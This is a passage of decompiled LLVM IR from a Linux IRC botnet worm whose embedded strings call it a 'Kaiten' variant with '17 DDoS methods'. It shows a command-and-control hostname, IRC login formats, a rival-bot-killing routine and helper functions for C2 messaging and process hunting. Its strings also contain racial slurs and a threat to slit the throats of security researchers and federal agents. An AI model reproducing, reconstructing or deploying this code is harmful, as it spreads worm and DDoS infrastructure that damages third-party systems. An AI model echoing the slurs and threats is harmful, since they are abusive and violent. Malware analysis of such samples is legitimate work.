@global_var_8068b48.426, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b4d.427, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b52.428, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b57.429, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b5c.430, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b61.431, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b66.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b6c.433, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b72.434, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b78.435, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b7e.436, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b84.437, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b8a.438, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b90.439, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b96.440, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068b9c.441, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068ba2.442, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068ba8.443, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068bab.444, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068bb6.225, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bbe.445, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bc1.446, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bc4.447, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bc7.448, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bca.449, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bcd.450, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bd0.451, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bd3.452, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068bd6.453, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bd9.454, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bdd.455, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068be1.456, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068be5.457, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068be9.458, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bed.459, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bf1.460, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bf5.461, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bf9.462, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068bfd.463, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068c01.464, i32 0, i32 0)]
@global_var_806b38f.466 = constant [22 x i8] c"Scanning for bot %s.\0A\00"
@global_var_806b3a5.467 = constant [24 x i8] c"Killing bot %s PID %d.\0A\00"
@global_var_806b3c0.469 = constant [32 x i8] c"Bot %s found at %s Deleting...\0A\00"
@global_var_806b3e0.470 = constant [31 x i8] c"Bot %s niggered successfully.\0A\00"
@global_var_806b3ff.472 = constant [26 x i8] c"Unable to nigger bot %s.\0A\00"
@global_var_806b41c.473 = constant [73 x i8] c"Bot %s was not found on the system. It must have been running in memory.\00"
@global_var_806b468.474 = constant [56 x i8] c"Botkill finished. %d bots killed and %d bots niggered.\0A\00"
@global_var_807dc84.493 = local_unnamed_addr global i32 0
@global_var_807506c.494 = local_unnamed_addr global i32 0
@global_var_807f0dc.586 = local_unnamed_addr global i32 0
@global_var_8068520.595 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_8070064.596 = global [16 x i8]* @global_var_8068520.595
@global_var_806d52c.597 = constant [73 x i8] c"SUPER MOTHERFUCKING KAITEN WORMY BY MILENKO. PRAISE KEK. NULLZSEC ROX!!!\00"
@global_var_806d578.598 = constant [68 x i8] c"Capsaicin kaiten variant coded (and wormified) by Milenko aka Freak\00"
@global_var_806d5bc.599 = constant [130 x i8] c"17 DDoS methods nigga! And for the netsec teams and feds reading this we will null all of your honeypots and slit your throats!!!\00"
@global_var_807da64.600 = local_unnamed_addr global i32 0
@global_var_807da68.601 = local_unnamed_addr global i32 0
@global_var_807da6c.602 = local_unnamed_addr global i32 0
@global_var_807da70.603 = local_unnamed_addr global i32 0
@global_var_806d63e.604 = constant [3 x i8] c"sh\00"
@global_var_807db7c.605 = local_unnamed_addr global i32 0
@global_var_806d641.606 = constant [8 x i8] c"KPinetK\00"
@global_var_806d64c.607 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_806d67c.608 = constant i32 1380253706
@global_var_806d50d.609 = constant [4 x i8] c"352\00"
@global_var_8070860.610 = global [4 x i8]* @global_var_806d50d.609
@global_var_8070864.611 = global i32 134568002
@global_var_806d67e.612 = constant [6 x i8] c"ERROR\00"
@global_var_807b620.613 = local_unnamed_addr global i32 0
@global_var_80748c0 = external global i32
@global_var_807b624.614 = local_unnamed_addr global i32 0
@global_var_807b628.615 = local_unnamed_addr global i32 0
@global_var_8074aa0.616 = global i32 0
@global_var_807f100.617 = local_unnamed_addr global i32 0
@global_var_807f104.618 = local_unnamed_addr global i32 0
@global_var_807f10c.619 = local_unnamed_addr global i32 0
@global_var_8074c80.620 = local_unnamed_addr global i32* @global_var_80748c0
@global_var_8074c84.621 = local_unnamed_addr global i32 -1
@global_var_80708a0.622 = global i32 0
@global_var_8074c90.628 = local_unnamed_addr global i32 34
@global_var_8074c8c.634 = local_unnamed_addr global i32 33
@global_var_807d8d0.636 = local_unnamed_addr global i32 0
@global_var_80794ac.642 = global i32 0
@global_var_80794c4.643 = local_unnamed_addr global i32 0
@global_var_80794c8.644 = local_unnamed_addr global i32 0
@global_var_80794cc.645 = local_unnamed_addr global i32 0
@global_var_8074eb0.646 = global i32 0
@global_var_80794e0.648 = global i32 0
@global_var_8074c88.650 = local_unnamed_addr global i32 32
@global_var_8079604.652 = global i32 0
@global_var_807b61c.654 = global i32 0
@global_var_807b618.655 = local_unnamed_addr global i32 0
@global_var_80708c0.659 = global i32 0
@global_var_807f118.660 = local_unnamed_addr global i32 0
@global_var_807b664.661 = global i32 0
@global_var_807b668.662 = global i32 0
@global_var_8074db0.665 = local_unnamed_addr global i32 2
@global_var_8074d7c.667 = global i32* bitcast (i16* @global_var_8074dc0.80 to i32*)
@global_var_807b63c.675 = global i32 0
@global_var_807b654.676 = global i32 0
@global_var_807b660.677 = local_unnamed_addr global i32 0
@global_var_805a52e.678 = constant [4 x i8] c"XZj\00"
@global_var_8074d98.680 = global i32 0
@global_var_807b688.681 = local_unnamed_addr global i32 0
@global_var_807b68c.682 = local_unnamed_addr global i32 0
@global_var_806f697.683 = constant [3 x i8] c": \00"
@global_var_806f699.684 = constant i32 539828224
@global_var_806d9e0.685 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_8074d80.691 = global i32 0
@global_var_806d9f4.692 = constant i32 0
@global_var_806da0c.693 = constant [6 x i8] c"(nil)\00"
@global_var_806da12.694 = constant [7 x i8] c"(null)\00"
@global_var_806da19.695 = constant i32 2949163
@global_var_806da86.697 = constant i32 327688
@global_var_8074fcc = external local_unnamed_addr global i32
@global_var_806f120.699 = constant i32 65536
@global_var_806da7e.700 = constant [8 x i8] c" +0-#'I\00"
@global_var_806da2c.701 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_806da69.702 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_806da5f.703 = constant i32 117506048
@global_var_806da50.704 = constant i32 331776
@global_var_806dac0.705 = constant [8 x i8] c"Success\00"
@global_var_806daaa.706 = constant [15 x i8] c"Unknown error \00"
@global_var_8074fd4.707 = local_unnamed_addr global i32* @global_var_806f120.699
@global_var_807d6a0.708 = global i32 0
@global_var_806e8d7.717 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_807d6c0.721 = global i32 0
@global_var_807d88c.722 = global i32 0
@global_var_807500c.723 = global i32 0
@global_var_807f560.724 = local_unnamed_addr global i32 0
@global_var_807f554.725 = global i32 0
@global_var_807f14c.730 = global i32 0
@global_var_807f150.731 = local_unnamed_addr global i32 0
@global_var_807f154.732 = global i32 0
@global_var_807f160.733 = local_unnamed_addr global i32 0
@global_var_807f454.734 = global i32 0
@global_var_807f47c.735 = local_unnamed_addr global i32 0
@global_var_807f46c.736 = local_unnamed_addr global i32 0
@global_var_807f470.737 = local_unnamed_addr global i32 0
@global_var_807f474.738 = local_unnamed_addr global i32 0
@global_var_807f490.739 = local_unnamed_addr global i32 0
@global_var_807f478.740 = local_unnamed_addr global i32 0
@global_var_807f484.741 = local_unnamed_addr global i32 0
@global_var_807f488.742 = local_unnamed_addr global i32 0
@global_var_807f494.743 = local_unnamed_addr global i32 0
@global_var_807f468.744 = local_unnamed_addr global i32 0
@global_var_807f464.746 = local_unnamed_addr global i32 0
@global_var_807f48c.747 = local_unnamed_addr global i32 0
@global_var_807f15c.748 = local_unnamed_addr global i32 0
@global_var_8074ec8.749 = global i32 0
@global_var_8074ee0.751 = global i32 0
@global_var_8074ef8 = external global i32
@global_var_8074fa0.758 = global i32 0
@global_var_807d8a4.759 = local_unnamed_addr global i32 0
@global_var_8070000.787 = global i32 -1
@global_var_8061a67.788 = constant i32 -294069
@global_var_807d8d4.789 = local_unnamed_addr global i32 0
@global_var_807d8d8.790 = local_unnamed_addr global i32 0
@global_var_807d900.796 = global i32 0
@global_var_807d8e0.798 = global i32 0
@global_var_807f530.801 = global i32 0
@global_var_807da44.803 = local_unnamed_addr global i32 0
@global_var_806f330.805 = constant [4 x i8] c"inf\00"
@global_var_806f333.810 = constant i32 1179535616
@global_var_806f340.811 = constant i32 2883630
@global_var_806f438.813 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_8074fd8.814 = global i32 134625261
@global_var_807f520.815 = global i32 0
@global_var_807d9c8.816 = global i32 0
@global_var_807d9e4.818 = global i32 0
@global_var_807d9fc.827 = global i32 0
@global_var_806f4fd.828 = constant i32 0
@global_var_806f4e3.830 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_806f520.831 = constant i32 134632180
@global_var_806f591.835 = constant i32 1868824690
@global_var_807f564.845 = local_unnamed_addr global i32 0
@global_var_806e926.846 = constant i32 1885929518
@global_var_806f55f.847 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_806f570.848 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_806f588.849 = constant [11 x i8] c"nameserver\00"
@global_var_806f593.850 = constant [7 x i8] c"domain\00"
@global_var_806f59a.851 = constant [7 x i8] c"search\00"
@global_var_807f544.852 = global i32 0
@global_var_806f5a4.860 = constant i32 134640556
@global_var_806f5b8.863 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_806f5d0.864 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_806f605.865 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_806f65e.873 = constant [11 x i8] c"/etc/hosts\00"
@global_var_806f669.874 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8075080.27 = external global i8*
@1 = internal constant [21 x i8] c"\10N\07\08`N\07\08\C0M\07\08\10N\07\08\C0M\07\08\00"
@global_var_8074d6c = local_unnamed_addr global i8* getelementptr inbounds ([21 x i8], [21 x i8]* @1, i32 0, i32 0)
@global_var_8074dc0.80 = global i16 288
@2 = internal constant [17 x i8] c"`N\07\08\C0M\07\08\10N\07\08\C0M\07\08\00"
@global_var_8074d70 = local_unnamed_addr global i8* getelementptr inbounds ([17 x i8], [17 x i8]* @2, i32 0, i32 0)
@3 = internal constant [5 x i8] c"\03\03\0D3\00"
@4 = internal constant [2 x i8] c"0\00"
@global_var_807f0f8.262 = external local_unnamed_addr global i8*
@global_var_8075060.468 = external local_unnamed_addr global i8*
@global_var_8075064.471 = external local_unnamed_addr global i8*
@global_var_8070060.594 = local_unnamed_addr global i64 578295974649135105
@global_var_806da9e.696 = external constant i8*
@5 = internal constant [3 x i8] c"\01\06\00"
@global_var_807f120.729 = global i8 0
@global_var_807f480.745 = local_unnamed_addr global i8 0
@global_var_807d8a0.750 = local_unnamed_addr global i8 0
@global_var_806f360.808 = constant x86_fp80* null
@global_var_807d9e0.817 = local_unnamed_addr global i8 0
@global_var_807da1c.842 = external global i8*
@global_var_807da34.843 = local_unnamed_addr global i64 0
@global_var_8075008.844 = local_unnamed_addr global i16 1
@global_var_807da48.861 = local_unnamed_addr global i16 0
@global_var_807da49.862 = global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_806992d.26 to i32)
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v4_804832f = ptrtoint i32* %stack_var_12 to i32
  %v5_8048347 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8075080.27 to i32), i32 %arg2, i32 %v4_804832f)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8075080.27 to i32), i32* @edi, align 4
  %v3_804835f = call i32 @_strlen(i8* bitcast (i8** @global_var_8075080.27 to i8*))
  %v4_804835f = mul i32 %v3_804835f, -1
  %v5_804835f = add i32 %v4_804835f, -2
  store i32 %v5_804835f, i32* @ecx, align 4
  %v1_8048365 = sub i32 0, %v4_804835f
  %v5_8048378 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8075080.27 to i32), i32 %v1_8048365)
  ret i32 %v5_8048378
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80484ef = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_80484ef

dec_label_pc_80484d0:                             ; preds = %dec_label_pc_8048512, %dec_label_pc_80484ef
  %v3_80484e1 = call i32 @_strlen(i8* %arg1)
  %v6_80484e8 = add i32 %v4_80484ef, %v3_80484e1
  %v1_80484eb = add i32 %v6_80484e8, -1
  %v1_80484ec = inttoptr i32 %v1_80484eb to i8*
  store i8 0, i8* %v1_80484ec, align 1
  br label %dec_label_pc_80484ef

dec_label_pc_80484ef:                             ; preds = %entry, %dec_label_pc_80484d0
  %v3_8048500 = call i32 @_strlen(i8* %arg1)
  %v6_8048507 = add i32 %v4_80484ef, %v3_8048500
  %v1_804850a = add i32 %v6_8048507, -1
  %v1_804850b = inttoptr i32 %v1_804850a to i8*
  %v2_804850b = load i8, i8* %v1_804850b, align 1
  %v10_804850e = icmp eq i8 %v2_804850b, 13
  br i1 %v10_804850e, label %dec_label_pc_80484d0, label %dec_label_pc_8048512

dec_label_pc_8048512:                             ; preds = %dec_label_pc_80484ef
  %v3_8048523 = call i32 @_strlen(i8* %arg1)
  %v6_804852a = add i32 %v4_80484ef, %v3_8048523
  %v1_804852d = add i32 %v6_804852a, -1
  %v1_804852e = inttoptr i32 %v1_804852d to i8*
  %v2_804852e = load i8, i8* %v1_804852e, align 1
  %v11_8048531 = icmp eq i8 %v2_804852e, 10
  br i1 %v11_8048531, label %dec_label_pc_80484d0, label %dec_label_pc_8048535

dec_label_pc_8048535:                             ; preds = %dec_label_pc_8048512
  %v1_804853a = sext i8 %v2_804852e to i32
  ret i32 %v1_804853a

; uselistorder directives
  uselistorder i8 %v2_804852e, { 1, 0 }
  uselistorder i32 %v4_80484ef, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80484ef, { 1, 0 }
}

define i32 @randstring(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804853b = load i32, i32* @ebp, align 4
  store i32 %v0_804853b, i32* %stack_var_-4, align 4
  %v4_804853b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804853b, i32* @ebp, align 4
  %v2_8048548 = call i32 @__GI_time(i32* null)
  %v1_8048550 = call i32 @srand(i32 %v2_8048548)
  %v4_8048563 = ptrtoint i8* %arg1 to i32
  %v1_8048566 = add i32 %v4_8048563, 1
  %v1_804856a = call i32 @malloc(i32 %v1_8048566)
  %tmp15 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v1_804856a, i32* %tmp15, align 4
  %v5_8048572 = icmp eq i32 %v1_804856a, 0
  %v1_8048576 = icmp eq i1 %v5_8048572, false
  %tmp23 = inttoptr i32 %v1_804856a to i8*
  br i1 %v1_8048576, label %dec_label_pc_80485b7.preheader, label %dec_label_pc_80485ce

dec_label_pc_80485b7.preheader:                   ; preds = %entry
  %v7_80485bd19 = icmp sgt i8* %arg1, null
  br i1 %v7_80485bd19, label %dec_label_pc_8048591, label %dec_label_pc_80485bf

dec_label_pc_8048591:                             ; preds = %dec_label_pc_8048591, %dec_label_pc_80485b7.preheader
  %v4_80485a6 = phi i8* [ %tmp23, %dec_label_pc_80485b7.preheader ], [ %v4_80485a6.pre, %dec_label_pc_8048591 ]
  %storemerge520 = phi i32 [ 0, %dec_label_pc_80485b7.preheader ], [ %v4_80485b4, %dec_label_pc_8048591 ]
  %v0_8048591 = call i32 @random()
  %v1_8048591 = sext i32 %v0_8048591 to i64
  %v15_804859b = urem i64 %v1_8048591, 62
  %v16_804859b = trunc i64 %v15_804859b to i32
  %v5_80485a6 = ptrtoint i8* %v4_80485a6 to i32
  %v6_80485a6 = add i32 %v5_80485a6, %storemerge520
  %v6_80485ac = add i32 %v16_804859b, ptrtoint ([63 x i8]* @global_var_8069954.35 to i32)
  %v1_80485af = inttoptr i32 %v6_80485ac to i8*
  %v2_80485af = load i8, i8* %v1_80485af, align 1
  %v3_80485b2 = inttoptr i32 %v6_80485a6 to i8*
  store i8 %v2_80485af, i8* %v3_80485b2, align 1
  %v4_80485b4 = add i32 %storemerge520, 1
  %v6_80485ba = inttoptr i32 %v4_80485b4 to i8*
  %v7_80485bd = icmp slt i8* %v6_80485ba, %arg1
  %v4_80485a6.pre = load i8*, i8** %stack_var_-16, align 4
  br i1 %v7_80485bd, label %dec_label_pc_8048591, label %dec_label_pc_80485bf

dec_label_pc_80485bf:                             ; preds = %dec_label_pc_8048591, %dec_label_pc_80485b7.preheader
  %v4_80485c2 = phi i8* [ %tmp23, %dec_label_pc_80485b7.preheader ], [ %v4_80485a6.pre, %dec_label_pc_8048591 ]
  %v5_80485c2 = ptrtoint i8* %v4_80485c2 to i32
  %v6_80485c2 = add i32 %v5_80485c2, %v4_8048563
  %v1_80485c5 = inttoptr i32 %v6_80485c2 to i8*
  store i8 0, i8* %v1_80485c5, align 1
  %v3_80485c8 = load i8*, i8** %stack_var_-16, align 4
  %v4_80485c8 = ptrtoint i8* %v3_80485c8 to i32
  br label %dec_label_pc_80485ce

dec_label_pc_80485ce:                             ; preds = %entry, %dec_label_pc_80485bf
  %storemerge = phi i32 [ %v4_80485c8, %dec_label_pc_80485bf ], [ 0, %entry ]
  %v2_80485d1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80485d1, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80485b4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i8** %stack_var_-16, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80485ce, { 1, 0 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804902e = load i32, i32* @ebx, align 4
  store i32 %v0_804902e, i32* %stack_var_-8, align 4
  %v2_8049039 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049039, i32* @ebx, align 4
  %v1_8049040 = call i32 @__libc_getpid(i32 0)
  %v0_8049045 = load i32, i32* @ebx, align 4
  %v2_8049045 = add i32 %v0_8049045, %v1_8049040
  %v1_804904b = call i32 @srand(i32 %v2_8049045)
  %v0_8049050 = call i32 @random()
  %v2_804905d = sub i32 1, %arg1
  %v1_804905f = add i32 %v2_804905d, %arg2
  %v5_8049060 = sext i32 %v1_804905f to i64
  %v1_8049065 = ashr i32 %v0_8049050, 31
  %v6_8049066 = zext i32 %v0_8049050 to i64
  %v8_8049066 = zext i32 %v1_8049065 to i64
  %v9_8049066 = mul nuw i64 %v8_8049066, 4294967296
  %v10_8049066 = or i64 %v9_8049066, %v6_8049066
  %v14_8049066 = srem i64 %v10_8049066, %v5_8049060
  %v15_8049066 = trunc i64 %v14_8049066 to i32
  %v5_804906b = add i32 %v15_8049066, %arg1
  %v2_8049071 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049071, i32* @ebx, align 4
  ret i32 %v5_804906b

; uselistorder directives
  uselistorder i32 %v0_8049050, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @proc_find(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052a56 = load i32, i32* @ebp, align 4
  store i32 %v0_8052a56, i32* %stack_var_-4, align 4
  %v4_8052a56 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052a56, i32* @ebp, align 4
  %v2_8052a66 = call i32 @__GI_opendir(i32 ptrtoint ([6 x i8]* @global_var_806b357.270 to i32))
  %v4_8052a6e = icmp eq i32 %v2_8052a66, 0
  %v1_8052a72 = icmp eq i1 %v4_8052a6e, false
  br i1 %v1_8052a72, label %dec_label_pc_8052b81.preheader, label %dec_label_pc_8052a78

dec_label_pc_8052b81.preheader:                   ; preds = %entry
  %tmp20 = inttoptr i32 %v2_8052a66 to i32*
  %v2_8052aa1 = ptrtoint i8** %stack_var_-28 to i32
  %v2_8052ad8 = ptrtoint i32* %stack_var_-540 to i32
  %v3_8052b8724 = call i32 @__GI_readdir(i32* %tmp20)
  %v4_8052b8f25 = icmp eq i32 %v3_8052b8724, 0
  %v1_8052b9327 = icmp eq i1 %v4_8052b8f25, false
  br i1 %v1_8052b9327, label %dec_label_pc_8052a93, label %dec_label_pc_8052b99

dec_label_pc_8052a78:                             ; preds = %entry
  %v3_8052a7f = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806b35d.271, i32 0, i32 0))
  br label %dec_label_pc_8052bae

dec_label_pc_8052a93:                             ; preds = %dec_label_pc_8052b81.preheader, %dec_label_pc_8052b81.backedge
  %v3_8052b8728 = phi i32 [ %v3_8052b87, %dec_label_pc_8052b81.backedge ], [ %v3_8052b8724, %dec_label_pc_8052b81.preheader ]
  %v1_8052a96 = add i32 %v3_8052b8728, 11
  %v5_8052aab = call i32 @strtol(i32 %v1_8052a96, i32 %v2_8052aa1, i32 10)
  %v3_8052ab3 = load i8*, i8** %stack_var_-28, align 4
  %v2_8052ab6 = load i8, i8* %v3_8052ab3, align 1
  %v4_8052ab9 = icmp eq i8 %v2_8052ab6, 0
  %v1_8052abb = icmp eq i1 %v4_8052ab9, false
  br i1 %v1_8052abb, label %dec_label_pc_8052b81.backedge, label %dec_label_pc_8052ac1

dec_label_pc_8052ac1:                             ; preds = %dec_label_pc_8052a93
  %v5_8052ae1 = call i32 @__GI_snprintf(i32 %v2_8052ad8, i32 512, i32 ptrtoint ([18 x i8]* @global_var_806b36e.272 to i32))
  store i32 %v2_8052ad8, i32* @eax, align 4
  %v3_8052af7 = call i32 @__GI_fopen(i32 %v2_8052ad8, i32 ptrtoint (i32* @global_var_8069f9a.88 to i32))
  %v4_8052aff = icmp eq i32 %v3_8052af7, 0
  br i1 %v4_8052aff, label %dec_label_pc_8052b81.backedge, label %dec_label_pc_8052b05

dec_label_pc_8052b05:                             ; preds = %dec_label_pc_8052ac1
  %v5_8052b1d = call i32 @fgets(i32 %v2_8052ad8, i32 512, i32 %v3_8052af7)
  %v1_8052b22 = icmp eq i32 %v5_8052b1d, 0
  br i1 %v1_8052b22, label %dec_label_pc_8052b76, label %dec_label_pc_8052b26

dec_label_pc_8052b26:                             ; preds = %dec_label_pc_8052b05
  store i32 %v2_8052ad8, i32* @eax, align 4
  %v3_8052b37 = call i32 @__GI_strtok(i32 %v2_8052ad8, i32 ptrtoint (i32* @global_var_806b380.273 to i32))
  store i32 %v3_8052b37, i32* @eax, align 4
  %v4_8052b49 = inttoptr i32 %v3_8052b37 to i8*
  %v4_8052b4c = call i32 @__GI_strcoll(i8* %v4_8052b49, i32 %arg1)
  %v1_8052b51 = icmp eq i32 %v4_8052b4c, 0
  %v1_8052b53 = icmp eq i1 %v1_8052b51, false
  br i1 %v1_8052b53, label %dec_label_pc_8052b76, label %dec_label_pc_8052b55

dec_label_pc_8052b55:                             ; preds = %dec_label_pc_8052b26
  %tmp22 = inttoptr i32 %v3_8052af7 to i16*
  %v3_8052b5b = call i32 @__GI_fclose(i16* %tmp22)
  %v3_8052b66 = call i32 @__GI_closedir(i32* %tmp20)
  br label %dec_label_pc_8052bae

dec_label_pc_8052b76:                             ; preds = %dec_label_pc_8052b26, %dec_label_pc_8052b05
  %tmp23 = inttoptr i32 %v3_8052af7 to i16*
  %v3_8052b7c = call i32 @__GI_fclose(i16* %tmp23)
  br label %dec_label_pc_8052b81.backedge

dec_label_pc_8052b81.backedge:                    ; preds = %dec_label_pc_8052b76, %dec_label_pc_8052a93, %dec_label_pc_8052ac1
  %v3_8052b87 = call i32 @__GI_readdir(i32* %tmp20)
  %v4_8052b8f = icmp eq i32 %v3_8052b87, 0
  %v1_8052b93 = icmp eq i1 %v4_8052b8f, false
  br i1 %v1_8052b93, label %dec_label_pc_8052a93, label %dec_label_pc_8052b99

dec_label_pc_8052b99:                             ; preds = %dec_label_pc_8052b81.backedge, %dec_label_pc_8052b81.preheader
  %v3_8052b9f = call i32 @__GI_closedir(i32* %tmp20)
  br label %dec_label_pc_8052bae

dec_label_pc_8052bae:                             ; preds = %dec_label_pc_8052b55, %dec_label_pc_8052a78, %dec_label_pc_8052b99
  %stack_var_-552.0 = phi i32 [ %v5_8052aab, %dec_label_pc_8052b55 ], [ -1, %dec_label_pc_8052b99 ], [ -1, %dec_label_pc_8052a78 ]
  %v2_8052bb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052bb4, i32* @ebp, align 4
  ret i32 %stack_var_-552.0

; uselistorder directives
  uselistorder i32 %v3_8052b87, { 1, 0 }
  uselistorder i32 %v3_8052af7, { 1, 0, 2, 3 }
  uselistorder i32* %tmp20, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i8** %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 1, 0 }
  uselistorder label %dec_label_pc_8052bae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b81.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052a93, { 1, 0 }
}

define i32 @getexename(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-524 = alloca i32, align 4
  %stack_var_-588 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052bb6 = load i32, i32* @ebp, align 4
  store i32 %v0_8052bb6, i32* %stack_var_-4, align 4
  %v4_8052bb6 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052bb6, i32* @ebp, align 4
  %v2_8052bdd = ptrtoint i32* %stack_var_-588 to i32
  %v4_8052be6 = call i32 @__GI_snprintf(i32 %v2_8052bdd, i32 64, i32 ptrtoint ([13 x i8]* @global_var_806b382.274 to i32))
  %v2_8052beb = icmp slt i32 %v4_8052be6, 0
  %v1_8052bed = icmp eq i1 %v2_8052beb, false
  br i1 %v1_8052bed, label %dec_label_pc_8052bfb, label %dec_label_pc_8052c68

dec_label_pc_8052bfb:                             ; preds = %entry
  %v2_8052bfe = ptrtoint i32* %stack_var_-524 to i32
  %v4_8052c15 = call i32 @readlink(i32 %v2_8052bdd, i32 %v2_8052bfe, i32 128)
  %v13_8052c1d = icmp eq i32 %v4_8052c15, -1
  %v1_8052c21 = icmp eq i1 %v13_8052c1d, false
  br i1 %v1_8052c21, label %dec_label_pc_8052c2f, label %dec_label_pc_8052c68

dec_label_pc_8052c2f:                             ; preds = %dec_label_pc_8052bfb
  %v5_8052c35 = icmp slt i32 %v4_8052c15, 128
  br i1 %v5_8052c35, label %dec_label_pc_8052c4e, label %dec_label_pc_8052c37

